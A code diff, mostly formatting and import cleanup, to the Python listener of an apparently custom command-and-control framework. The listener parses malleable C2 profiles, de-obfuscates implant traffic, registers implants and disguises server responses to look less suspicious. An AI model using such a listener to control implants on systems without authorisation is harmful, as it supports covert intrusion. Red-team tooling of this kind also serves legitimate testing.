@@ -15,33 +15,25 @@ codes used.
 https://pypi.org/project/pyMalleableProfileParser/0.3/
 """
 
-import logging
 import re
-import sys
-import tempfile
-from logging.handlers import RotatingFileHandler
-from pathlib import Path
 
 import msgpack
 
 # NEW: Structlog imports
 import structlog
 import uvicorn
-from concurrent_log_handler import ConcurrentRotatingFileHandler
 from edwh_uuid7 import uuid7
 from fastapi import FastAPI, HTTPException, Request, Response, status
-from flask import request
 from mpp import MalleableProfile
 from starlette.middleware.base import BaseHTTPMiddleware
-from yarl import URL
 
 from ...db.mysql_connector import get_mysql_session
 
 # from ...modules.mysql_functions import ImplantService
 from ...modules.neo4j_functions import Neo4jImplantNodeService
 from ...modules.redis_functions import RedisImplantTaskService
-from ...modules.task.task import MetadataService, TaskService
-from ...schemas.implant import ImplantCreate, ImplantMetadata, ImplantUpdate
+from ...modules.task.task import TaskService
+from ...schemas.implant import ImplantCreate, ImplantUpdate
 from ...utils.checks import check_type
 from ..malc2 import (
     HttpConfigBlockServerParser,
@@ -49,7 +41,6 @@ from ..malc2 import (
     HttpGetBlockServerParser,
     HttpPostBlockClientParser,
     HttpPostBlockServerParser,
-    clean_ast_backslash_delimiters,
     load_malleable_profile,
 )
 
@@ -85,7 +76,7 @@ def run(
 
     """
     Quick explanation, mp takes a file, not a string (it has a from_string method... but it wasn't working)
-    So, tempfile on the host, then pass that into the mp parser. Whatever, it works well enough. 
+    So, tempfile on the host, then pass that into the mp parser. Whatever, it works well enough.
 
     Tried StringIO, didn't work either
     """
@@ -124,12 +115,12 @@ def run(
     # pull out verbs, tldr, this is the safest way to do it
     try:
         get_verb = mp.http_get.verb.value if mp.http_get.verb.value else "GET"
-    except Exception as e:
+    except Exception:
         get_verb = "GET"
 
     try:
         post_verb = mp.http_post.verb.value if mp.http_post.verb.value else "POST"
-    except Exception as e:
+    except Exception:
         post_verb = "POST"
 
     # add catchall route
@@ -143,9 +134,7 @@ def run(
 
     # reload needs to be OFF.
     # server_header=false disabled  "server uvicorn" in the response
-    uvicorn.run(
-        app, host=listener_host, port=listener_port, reload=False, server_header=False
-    )
+    uvicorn.run(app, host=listener_host, port=listener_port, reload=False, server_header=False)
 
 
 ###################################
@@ -165,7 +154,7 @@ def check_if_data(data_from_request):  #
         raise HTTPException(
             status_code=status.HTTP_400_BAD_REQUEST,
             # intentially vague to not give away what field the data is in
-            detail=f"Missing required data",
+            detail="Missing required data",
         )
 
 
@@ -207,9 +196,7 @@ def check_user_agent(user_agent: str) -> bool:
 
             # Check if the user-agent matches the pattern
             if re.match(regex, user_agent):
-                listener_logger.debug(
-                    "user_agent_blocked", pattern=pattern, ua=user_agent
-                )
+                listener_logger.debug("user_agent_blocked", pattern=pattern, ua=user_agent)
                 return False  # Blocked agent
 
     # If blocked_useragents passed, we don't need to check allowed_useragents
@@ -221,9 +208,7 @@ def check_user_agent(user_agent: str) -> bool:
 
             # Check if the user-agent matches the pattern
             if re.match(regex, user_agent):
-                listener_logger.debug(
-                    "user_agent_allowed", pattern=pattern, ua=user_agent
-                )
+                listener_logger.debug("user_agent_allowed", pattern=pattern, ua=user_agent)
                 return True  # Allowed agent
 
     # Default return if no matches were found
@@ -252,7 +237,8 @@ async def deobsfucate_malleable_c2_request_data(
     parser_class: What class the malleable c2 is parsed with
     block_field,  field to apply to, ex, id, output, etc. mp.http_post.client.id otherwise parser doesn't know
     malleable_c2_method_block: The parent method block, ex mc2.http_get (sorry, confusing)
-    terminator_key=None, (optional) the key value that is the terminator, if applicable. Used in headers/params to locate data
+    terminator_key=None, (optional) the key value that is the terminator, if applicable.
+        Used in headers/params to locate data
 
     """
     match terminator_type:
@@ -267,17 +253,11 @@ async def deobsfucate_malleable_c2_request_data(
 
             try:
                 hce = parser_class(malleable_c2_block)
-                data = hce.apply_transforms(
-                    data=data_from_request, block_field=block_field
-                )
-                listener_logger.debug(
-                    "deobfuscation_complete", type="header", len=len(data)
-                )
+                data = hce.apply_transforms(data=data_from_request, block_field=block_field)
+                listener_logger.debug("deobfuscation_complete", type="header", len=len(data))
                 return data
             except Exception as e:
-                listener_logger.error(
-                    "deobfuscation_failed", error=str(e), type="header"
-                )
+                listener_logger.error("deobfuscation_failed", error=str(e), type="header")
                 raise e
 
         case "parameter":
@@ -291,17 +271,11 @@ async def deobsfucate_malleable_c2_request_data(
 
             try:
                 hce = parser_class(malleable_c2_block)
-                data = hce.apply_transforms(
-                    data=data_from_request_bytes, block_field=block_field
-                )
-                listener_logger.debug(
-                    "deobfuscation_complete", type="parameter", len=len(data)
-                )
+                data = hce.apply_transforms(data=data_from_request_bytes, block_field=block_field)
+                listener_logger.debug("deobfuscation_complete", type="parameter", len=len(data))
                 return data
             except Exception as e:
-                listener_logger.error(
-                    "deobfuscation_failed", error=str(e), type="parameter"
-                )
+                listener_logger.error("deobfuscation_failed", error=str(e), type="parameter")
                 raise e
         case "print":
             # in body, so just get body
@@ -311,17 +285,11 @@ async def deobsfucate_malleable_c2_request_data(
 
             try:
                 hce = parser_class(client_block=malleable_c2_block)
-                data = hce.apply_transforms(
-                    data=data_from_request, block_field=block_field
-                )
-                listener_logger.debug(
-                    "deobfuscation_complete", type="print", len=len(data)
-                )
+                data = hce.apply_transforms(data=data_from_request, block_field=block_field)
+                listener_logger.debug("deobfuscation_complete", type="print", len=len(data))
                 return data
             except Exception as e:
-                listener_logger.error(
-                    "deobfuscation_failed", error=str(e), type="print"
-                )
+                listener_logger.error("deobfuscation_failed", error=str(e), type="print")
                 raise e
 
         # for some reason
@@ -346,17 +314,11 @@ async def deobsfucate_malleable_c2_request_data(
             # return uri_append.encode()
             try:
                 hce = parser_class(client_block=malleable_c2_block)
-                data = hce.apply_transforms(
-                    data=data_in_uri_bytes, block_field=block_field
-                )
-                listener_logger.debug(
-                    "deobfuscation_complete", type="print", len=len(data)
-                )
+                data = hce.apply_transforms(data=data_in_uri_bytes, block_field=block_field)
+                listener_logger.debug("deobfuscation_complete", type="print", len=len(data))
                 return data
             except Exception as e:
-                listener_logger.error(
-                    "deobfuscation_failed", error=str(e), type="print"
-                )
+                listener_logger.error("deobfuscation_failed", error=str(e), type="print")
                 raise e
 
         case _:
@@ -395,7 +357,8 @@ class HeadersMiddleware(BaseHTTPMiddleware):
         for header, value in headers_to_add.items():
             # del existing headers first (so you don't endup with 2 of the same)
             # RFC 7230 (Section 3.2.2) (for HTTP/1.1) states that:
-            # A sender SHOULD NOT generate duplicate header fields, and a recipient SHOULD ignore duplicate header fields unless otherwise indicated."
+            # A sender SHOULD NOT generate duplicate header fields, and a recipient SHOULD ignore duplicate header
+            # fields unless otherwise indicated."
             if header in response.headers:
                 """
                 Ignore header if it already exists.
@@ -418,7 +381,7 @@ class HeadersMiddleware(BaseHTTPMiddleware):
 
             Headers work and are in order now
 
-            Note: Date seems to show up first every time for some reason. 
+            Note: Date seems to show up first every time for some reason.
         """
         response.init_headers(headers=ordered_headers)
         # listener_logger.debug(response.headers)
@@ -435,7 +398,7 @@ class DumpRequestMiddleware(BaseHTTPMiddleware):
     async def dispatch(self, request, call_next):
         # Call the next request handler
 
-        body = await request.body()
+        # body = await request.body()
 
         # print("=== REQUEST DUMP ===")
         # print("METHOD:", request.method)
@@ -466,7 +429,6 @@ def _register_new_implant(unpacked_metadata: dict, request: Request) -> bytes:
     listener_logger.info("New implant connected")
 
     with get_mysql_session() as session:
-
         # explicity remove the implant_uuid, to fit the implantcreate dataclass
         # The uuid is currently NULL here (0000000...) and if we were to include it, it would save to the
         # db as null, then every implant would have a NULL uuid.
@@ -516,9 +478,7 @@ async def http_get(request: Request) -> Response:
     """
     # STRUCTLOG: Clean context and bind Request info
     structlog.contextvars.clear_contextvars()
-    structlog.contextvars.bind_contextvars(
-        method="GET", ip=request.client.host, path=request.url.path
-    )
+    structlog.contextvars.bind_contextvars(method="GET", ip=request.client.host, path=request.url.path)
 
     # security checks
     user_agent = request.headers.get("user-agent")
@@ -535,9 +495,7 @@ async def http_get(request: Request) -> Response:
     """
     hce = HttpGetBlockClientParser(client_block=mp.http_get.client)
     try:
-        metadata_terminator_type, metadata_terminator_key = (
-            hce.get_metadata_terminator()
-        )
+        metadata_terminator_type, metadata_terminator_key = hce.get_metadata_terminator()
         data_from_implant = await deobsfucate_malleable_c2_request_data(
             request=request,
             terminator_type=metadata_terminator_type,
@@ -624,9 +582,7 @@ def http_response(data_from_implant: bytes, request: Request):
 
         case _:
             # unknown terminator
-            listener_logger.error(
-                "unknown_server_terminator", terminator=terminator_type
-            )
+            listener_logger.error("unknown_server_terminator", terminator=terminator_type)
             # note still sent headers to make it somewhat less suspicous
             return Response(status_code=500, headers=headers)
 
@@ -646,9 +602,7 @@ async def http_post(request: Request) -> Response:
     """
     # STRUCTLOG: Clean context and bind Request info
     structlog.contextvars.clear_contextvars()
-    structlog.contextvars.bind_contextvars(
-        method="POST", ip=request.client.host, path=request.url.path
-    )
+    structlog.contextvars.bind_contextvars(method="POST", ip=request.client.host, path=request.url.path)
 
     user_agent = request.headers.get("user-agent")
     listener_logger.debug("incoming_request", ua=user_agent)
@@ -729,9 +683,7 @@ async def http_post(request: Request) -> Response:
         listener_logger.error("post_id_error", error=str(e))
         raise HTTPException(status_code=400, detail="Invalid or malformed client data")
 
-    response = http_post_response(
-        data_from_implant=data_from_implant, implant_uuid=implant_uuid_str
-    )
+    response = http_post_response(data_from_implant=data_from_implant, implant_uuid=implant_uuid_str)
     return response
 
 
@@ -783,9 +735,7 @@ def http_post_response(data_from_implant: bytes, implant_uuid):
 
         case _:
             # unknown terminator
-            listener_logger.error(
-                "unknown_server_terminator", terminator=terminator_type
-            )
+            listener_logger.error("unknown_server_terminator", terminator=terminator_type)
             # note still sent headers to make it somewhat less suspicous
             return Response(status_code=500, headers=headers)
 
@@ -811,8 +761,8 @@ async def http_catchall(request: Request, full_path: str):
     # Important: The path might come in without the leading slash from the param
     actual_path = request.url.path
 
-    # note, this technically uri could be a list. Could randomly choose from that list, but i think it's more geared towards letting the implant
-    # choose from the list instead...
+    # note, this technically uri could be a list. Could randomly choose from that list, but i think it's
+    # more geared towards letting the implant choose from the list instead...
 
     # pull out the needed uri's
     http_get_uri = mp.http_get.uri.value
@@ -821,14 +771,12 @@ async def http_catchall(request: Request, full_path: str):
     # pull out verbs, tldr, this is the safest way to do it
     try:
         http_get_method = mp.http_get.verb.value if mp.http_get.verb.value else "GET"
-    except Exception as e:
+    except Exception:
         http_get_method = "GET"
 
     try:
-        http_post_method = (
-            mp.http_post.verb.value if mp.http_post.verb.value else "POST"
-        )
-    except Exception as e:
+        http_post_method = mp.http_post.verb.value if mp.http_post.verb.value else "POST"
+    except Exception:
         http_post_method = "POST"
 
     # path check both GET and POST to make sure we are only letting through correct implant traffic
@@ -848,8 +796,5 @@ async def http_catchall(request: Request, full_path: str):
         return response
 
     else:
-        listener_logger.debug(
-            "URI did not match any configured endpoints",
-            extra={"path": actual_path, "method": request.method},
-        )
+        listener_logger.debug("URI did not match any configured endpoints", path=actual_path, method=request.method)
         return {"error": "Not Found"}, 404
